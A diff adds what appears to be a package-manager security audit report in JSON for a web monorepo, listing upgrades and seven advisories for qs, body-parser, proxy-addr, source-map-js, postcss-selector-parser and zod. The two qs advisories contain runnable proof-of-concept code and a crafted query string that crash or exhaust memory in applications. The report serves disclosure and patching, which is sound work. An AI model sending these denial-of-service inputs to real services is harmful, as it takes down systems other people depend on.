@@ -1,0 +1,407 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241209,
+          "path": "apps__web>tailwindcss>postcss>source-map-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "source-map-js",
+      "target": "1.2.2",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241210,
+          "path": "packages__api>express>proxy-addr",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "proxy-addr",
+      "target": "2.0.8",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1243073,
+          "path": "packages__api>express>body-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "body-parser",
+      "target": "1.20.9",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "qs",
+      "resolves": [
+        {
+          "id": 1158506,
+          "path": "packages__api>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "packages__api>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss-selector-parser",
+      "resolves": [
+        {
+          "id": 1241232,
+          "path": "apps__web>tailwindcss>postcss-selector-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "zod",
+      "resolves": [
+        {
+          "id": 1243066,
+          "path": "packages__schemas>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1158506": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "packages\\api > express@4.22.2 > qs@6.15.3",
+            "packages\\api > express-rate-limit@7.5.1 > express@4.22.2 > qs@6.15.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82562\n- https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464\n- https://github.com/advisories/GHSA-x5fp-wj9c-mxmx",
+      "created": "2026-09-02T14:46:57.000Z",
+      "id": 1158506,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+      "reported_by": null,
+      "title": "qs array-limit bypass via bracket-key comma parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82562"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.14.2 <=6.15.3",
+      "github_advisory_id": "GHSA-x5fp-wj9c-mxmx",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:46:58.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "packages\\api > express@4.22.2 > qs@6.15.3",
+            "packages\\api > express-rate-limit@7.5.1 > express@4.22.2 > qs@6.15.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps\\web > tailwindcss@3.4.19 > postcss@8.5.28 > source-map-js@1.2.1",
+            "apps\\web > tailwindcss@3.4.19 > postcss-import@15.1.0 > postcss@8.5.28 > source-map-js@1.2.1",
+            "apps\\web > tailwindcss@3.4.19 > postcss-js@4.1.0 > postcss@8.5.28 > source-map-js@1.2.1",
+            "apps\\web > tailwindcss@3.4.19 > postcss-load-config@6.0.1 > postcss@8.5.28 > source-map-js@1.2.1",
+            "apps\\web > tailwindcss@3.4.19 > postcss-nested@6.2.0 > postcss@8.5.28 > source-map-js@1.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241210": {
+      "findings": [
+        {
+          "version": "2.0.7",
+          "paths": [
+            "packages\\api > express@4.22.2 > proxy-addr@2.0.7",
+            "packages\\api > express-rate-limit@7.5.1 > express@4.22.2 > proxy-addr@2.0.7"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/proxy-addr/security/advisories/GHSA-jqcg-44mw-7w3h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-90711\n- https://github.com/jshttp/proxy-addr/commit/780911d84d18e2c5fa008ed0c0d387631ec11965\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/jshttp/proxy-addr/releases/tag/v2.0.8\n- https://github.com/advisories/GHSA-jqcg-44mw-7w3h",
+      "created": "2026-10-05T23:30:26.000Z",
+      "id": 1241210,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`proxy-addr` determines which network hops are trusted proxies so that `X-Forwarded-For` can be believed. When an application configures a trust subnet as an IPv4-mapped IPv6 address with a short prefix, such as `::ffff:10.0.0.0/8` (the correct spelling is `::ffff:10.0.0.0/104`), the subnet compiles with all-zero leading bits and matches every IPv4 address instead of the block it names. The same happens for any IPv6 trust subnet with zero leading bits, such as `::/1`.\n\nEvery unauthenticated client is then trusted as a proxy at hop 0, so `proxyaddr(req, trust)`, and therefore `req.ip` and `req.ips` in Express, returns whatever the client sends in `X-Forwarded-For`. This defeats IP-based access control, rate limiting, geolocation, and audit logging. The misconfiguration compiles without any error, and the same block written correctly behaves correctly, so the difference is not visible from the configuration.\n\n### Patches\n\nUpgrade to `proxy-addr` 2.0.8. An IPv4 address now matches an IPv6 trust subnet only when that subnet is a genuine IPv4-mapped subnet whose prefix covers the mapped marker.\n\n### Workarounds\n\nWrite IPv4 trust subnets in plain IPv4 notation (for example `10.0.0.0/8`). If IPv4-mapped IPv6 notation is required, use the full form so the prefix covers the mapped marker (for example `::ffff:10.0.0.0/104` for the `10.0.0.0/8` block).",
+      "reported_by": null,
+      "title": "proxy-addr vulnerable to IP spoofing via IPv4-mapped IPv6 trust subnet",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-90711"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "proxy-addr",
+      "vulnerable_versions": ">=1.1.0 <2.0.8",
+      "github_advisory_id": "GHSA-jqcg-44mw-7w3h",
+      "recommendation": "Upgrade to version 2.0.8 or later",
+      "patched_versions": ">=2.0.8",
+      "updated": "2026-10-05T23:30:27.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-290",
+        "CWE-348",
+        "CWE-697"
+      ],
+      "url": "https://github.com/advisories/GHSA-jqcg-44mw-7w3h"
+    },
+    "1241232": {
+      "findings": [
+        {
+          "version": "6.1.4",
+          "paths": [
+            "apps\\web > tailwindcss@3.4.19 > postcss-nested@6.2.0 > postcss-selector-parser@6.1.4",
+            "apps\\web > tailwindcss@3.4.19 > postcss-selector-parser@6.1.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss-selector-parser/security/advisories/GHSA-rj75-hqrm-r3gf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104844\n- https://github.com/postcss/postcss-selector-parser/commit/62b191792df0a0bc56062e5a875bc74aae2a51cd\n- https://github.com/postcss/postcss-selector-parser/releases/tag/7.1.6\n- https://github.com/advisories/GHSA-rj75-hqrm-r3gf",
+      "created": "2026-10-05T22:53:54.000Z",
+      "id": 1241232,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as\n`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id\nindexes. Three passes scanned those index arrays linearly for every index,\nmaking the parse O(n^2) in the number of indexes rather than in input length:\n`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.\nParsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a\nsingle thread. A benign selector of identical byte size parses in tens of\nmilliseconds, so the cost is driven by the index count, not the input size.\nThe nesting depth of such a selector is 0, so the `maxNestingDepth` guard added\nin 7.1.3 offers no protection.\n\nReachability is deployment dependent. Only consumers that parse untrusted,\nattacker-supplied selectors synchronously in a request path are exposed, for\nexample CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary\nbuild-time use on trusted sources is not affected.\n\n### Patches\n\nFixed in 7.1.6. The three passes now use Set membership tests, making parsing\nlinear in the number of indexes. There is no behaviour change: parsing is\nbyte-identical on a differential corpus of 8413 selectors.\n\n### Workarounds\n\nCap the size of selectors accepted from untrusted sources before parsing.",
+      "reported_by": null,
+      "title": "PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104844"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss-selector-parser",
+      "vulnerable_versions": "<7.1.6",
+      "github_advisory_id": "GHSA-rj75-hqrm-r3gf",
+      "recommendation": "Upgrade to version 7.1.6 or later",
+      "patched_versions": ">=7.1.6",
+      "updated": "2026-10-05T22:53:57.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-rj75-hqrm-r3gf"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "3.25.76",
+          "paths": [
+            "apps\\web > @civic-relay/core@link:../../packages/core > @civic-relay/schemas@link:../../packages/schemas > zod@3.25.76",
+            "apps\\web > @civic-relay/core@link:../../packages/core > @civic-relay/transports@link:../../packages/transports > @civic-relay/schemas@link:../../packages/schemas > zod@3.25.76",
+            "apps\\web > @civic-relay/schemas@link:../../packages/schemas > zod@3.25.76",
+            "apps\\web > @civic-relay/transports@link:../../packages/transports > @civic-relay/schemas@link:../../packages/schemas > zod@3.25.76",
+            "packages\\api > @civic-relay/core@link:../core > @civic-relay/schemas@link:../schemas > zod@3.25.76",
+            "packages\\api > @civic-relay/core@link:../core > @civic-relay/transports@link:../transports > @civic-relay/schemas@link:../schemas > zod@3.25.76",
+            "packages\\api > @civic-relay/schemas@link:../schemas > zod@3.25.76",
+            "packages\\core > @civic-relay/schemas@link:../schemas > zod@3.25.76",
+            "packages\\core > @civic-relay/transports@link:../transports > @civic-relay/schemas@link:../schemas > zod@3.25.76",
+            "packages\\schemas > zod@3.25.76",
+            "packages\\transports > @civic-relay/schemas@link:../schemas > zod@3.25.76"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243073": {
+      "findings": [
+        {
+          "version": "1.20.8",
+          "paths": [
+            "packages\\api > express@4.22.2 > body-parser@1.20.8",
+            "packages\\api > express-rate-limit@7.5.1 > express@4.22.2 > body-parser@1.20.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-27r3-jxmh-p828\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111181\n- https://github.com/expressjs/body-parser/commit/1260c3845f54502a05a87594f09a334786bb34d7\n- https://github.com/expressjs/body-parser/commit/f7075eae3a84c3473ab4bf0a777da28db208e916\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.9\n- https://github.com/expressjs/body-parser/releases/tag/v2.4.0\n- https://github.com/advisories/GHSA-27r3-jxmh-p828",
+      "created": "2026-10-23T20:53:11.000Z",
+      "id": 1243073,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA single request can crash any application using `body-parser` with default options. When a request carries a `Content-Encoding` (for example `gzip`), `body-parser` pipes it into a decompression stream and, after reading the body, leaves that stream piped with no error listener. A payload of one valid compressed frame followed by trailing bytes decodes and the application responds normally, but the trailing bytes then reach the already-finished decoder, which emits an error that is re-thrown as an uncaught exception and terminates the process. No authentication or matching route is required, since parsing runs before routing.\n\n### Patches\n\nFixed in body-parser 2.4.0 and 1.20.9. Upgrade to one of these versions.\n\n### Workarounds\n\nPass `inflate: false` to the body-parser middleware if the application does not need to accept compressed request bodies. This rejects encoded requests before any decompression stream is created.",
+      "reported_by": null,
+      "title": "body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111181"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "body-parser",
+      "vulnerable_versions": "<1.20.9",
+      "github_advisory_id": "GHSA-27r3-jxmh-p828",
+      "recommendation": "Upgrade to version 1.20.9 or later",
+      "patched_versions": ">=1.20.9",
+      "updated": "2026-10-23T20:53:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-27r3-jxmh-p828"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 3,
+      "high": 3,
+      "critical": 1
+    },
+    "dependencies": 276,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 276
+  }
+}
